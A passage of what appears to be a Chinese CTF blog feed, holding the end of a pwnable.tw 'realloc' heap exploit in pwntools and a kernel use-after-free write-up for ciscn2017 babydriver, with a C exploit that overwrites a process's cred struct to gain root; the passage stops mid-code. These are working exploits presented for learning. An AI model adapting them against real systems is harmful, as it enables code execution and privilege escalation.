class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(data) == size):</span><br><span class="line">        io.send(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(data) == size):</span><br><span class="line">            io.send(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.sendline(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;b* 0x401707\n&quot;</span> <span class="comment"># break at call to menu</span></span><br><span class="line">    cmd+=<span class="string">&quot;b *0x40129D\n&quot;</span> <span class="comment"># break at call to atoll in realloc</span></span><br><span class="line">    cmd+=<span class="string">&quot;b *0x401603\n&quot;</span> <span class="comment"># break at atoll in free</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0x404080</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x0</span>,<span class="string">&quot;&quot;</span>) <span class="comment"># equals to free trigger UAF</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.got[<span class="string">&#x27;atoll&#x27;</span>]) + p64(<span class="number">0</span>)) <span class="comment"># clear tcache.keys</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&quot;aa&quot;</span>) <span class="comment"># unuseable one, now ptr1 and ptr2 are same</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># now 1 is empty</span></span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.got[<span class="string">&#x27;atoll&#x27;</span>])) <span class="comment"># 0x50 [  1]: 0xec1260 —▸ 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&quot;bbb&quot;</span>) <span class="comment"># 0x50 [  0]:  0x404048 (atoll@got.plt) ◂— ...  now ptr1 and ptr2 are same</span></span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">&quot;bbb&quot;</span>) <span class="comment"># realloc so they will be put into different bins</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x28</span>,p64(elf.got[<span class="string">&#x27;atoll&#x27;</span>]))</span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">&quot;ccc&quot;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">&quot;eee&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">now heap looks like</span></span><br><span class="line"><span class="string">0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="string">0x30 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="string">0x40 [  1]: 0xb9e260 ◂— 0x0</span></span><br><span class="line"><span class="string">0x50 [  1]: 0xb9e260 ◂— 0x0</span></span><br><span class="line"><span class="string">and both heap pointers are free</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="string">&quot;%p.%p.%p.%p&quot;</span>)) <span class="comment"># leak</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x10.&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;.&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x0768b2</span> - <span class="number">0xb7757</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))  </span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># get libc_base, use another GOT to write system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># alloc(0,0x28)</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># alloc(&quot;%1c&quot;,&quot;%28c&quot;,p64(system))</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&quot;%1c&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&quot;%28c&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">io.sendline(p64(system))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># free one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/02/01/pwnable-realloc/image-20220201202142038.png" alt="image-20220201202142038"></p><p>本地出了就是出了(doge)————nich0las</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">https://n0va-scy.github.io/2019/07/03/pwnable.tw/</a></p><p><a href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-3-UAF</title>
      <link href="/2022/01/31/kernel-3-UAF/"/>
      <url>/2022/01/31/kernel-3-UAF/</url>
      
        <content type="html"><![CDATA[<p>内核漏洞学习之——UAF漏洞<br>这次的学习主要基于CTF-wiki以及网上的一些教程</p><span id="more"></span><h1 id="ciscn2017-babydriver"><a href="#ciscn2017-babydriver" class="headerlink" title="ciscn2017 babydriver"></a>ciscn2017 babydriver</h1><h2 id="看文件系统启动脚本"><a href="#看文件系统启动脚本" class="headerlink" title="看文件系统启动脚本"></a>看文件系统启动脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意看第12行，insmod表示加载某个驱动，这个驱动应该就是有问题的。</p><p>找到上面驱动路径，查看一下驱动是否有保护,发现是没有canary，那说明可能是溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到启动脚本里面有kvm，这是一个内核配置。如果我们在vmware里面做题，需要右键虚拟机&gt;设置&gt;处理器 设置为如下内容。处理器数量和内核数量有一个大于1即可。</p></blockquote><p><img src="/2022/01/31/kernel-3-UAF/image-20220131132635979.png" alt="image-20220131132635979"></p><p>也参考了<a href="https://stackoverflow.com/questions/14542754/qemu-kvm-kernel-module-no-such-file-or-directory">此链接</a>,设置了modules.conf的内容。但是没用；到bios里面找kvm，发现也没有。最后在vmware里面设置，之后成功。</p><h2 id="逆向-ko文件"><a href="#逆向-ko文件" class="headerlink" title="逆向.ko文件"></a>逆向.ko文件</h2><p>先找到ioctl函数，这是我们和驱动交互的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>发现驱动主要做两件事情，malloc和print。其中malloc时会先free掉之前分配的驱动空间，但是没有对指针清空，可能导致UAF。而且kmalloc和kfree实现起来和用户态也有很大不同，<a href="https://www.shuzhiduo.com/A/QV5Zwvjydy/">源码这篇文章有解析</a>所以不能直接用。</p><p>babyopen主要申请了一块大小为0x40字节的内存，并将地址存在<code>babydev_struct.device_buf</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>babywrite</code></p><p>工作主要是将用户的输入复制到之前open生成的buf中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>babyread</code></p><p>babyread做了几乎相同的工作，把buf中的内容返还给用户，输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的反编译有些问题，主要是copy_from_user和copy_to_user。这里在IDA里面用y修改函数签名就可以了。</p><h2 id="思路-劫持cred结构体"><a href="#思路-劫持cred结构体" class="headerlink" title="思路-劫持cred结构体"></a>思路-劫持cred结构体</h2><p>没有传统的溢出。但是存在一个<strong>伪条件竞争引发的 UAF 漏洞</strong>。什么意思呢？</p><p>注意观察这里<strong>全局结构体</strong>是唯一确定的，如果上一个进程释放了某个结构体，但是下一个进程启动的时候正好还需要新空间来储存某些数据（无论是内核结构体还是用户结构体），那么这一块空间就会给到下一个进程。如果正好被分配到<code>cred</code>结构体中，我们就可以<strong>利用没有被清空的指针对进程的权限做任意的操作了</strong>。其关键结构体就是cred结构体。cred结构体是一个专门用来<strong>管理进程权限的结构体</strong>。可想而知其重要性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">cred结构体源码在这里</a></p><p>上图中<code>uid</code>，<code>gid</code>等表示进程所在权限组。将他们设置为0表示进程权限组为root，可以执行root命令。<strong>因此，只需要将cred结构体中gid等内容设置为0，之后利用此进程启动一个system(“/bin/sh”)，就能拿到一个用户态的root shell</strong>。</p><p>这里程序开了semp，在内核中我们不能直接执行用户态代码。因此commit_creds(prepare_creds(0))不能直接调用。如果没有开，也可以使用这条语句获得shell。</p><blockquote><p>cred结构体大小如何确定？</p><p>ctf-wiki上面提到直接看源码计算。但是源码也不太好找。这里比较简单的方式是<a href="https://www.jianshu.com/p/5dbdabba7e75">链接</a>中的方法，自己先编写一个能够打印cred结构体长度的driver，放到kernel中让他输出就可以了。但是这也需要下载linux源码并编译内核，需要很长的时间和内存。</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>); <span class="comment">// mmap a space for fd1</span></span><br><span class="line">    close(fd1); <span class="comment">// release the space, but pointer will still exist in fd2</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;fork error\n&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid != <span class="number">0</span>) <span class="comment">// father process</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(pid);</span><br><span class="line">        close(fd2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// child process</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// rewrite the struct</span></span><br><span class="line">        <span class="type">char</span> payload[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,payload,<span class="number">30</span>); <span class="comment">// 长度为30的确定方法：记住或者看源码数据类型即可</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// check group</span></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] rooted&quot;</span>);</span><br><span class="line">            system(<span 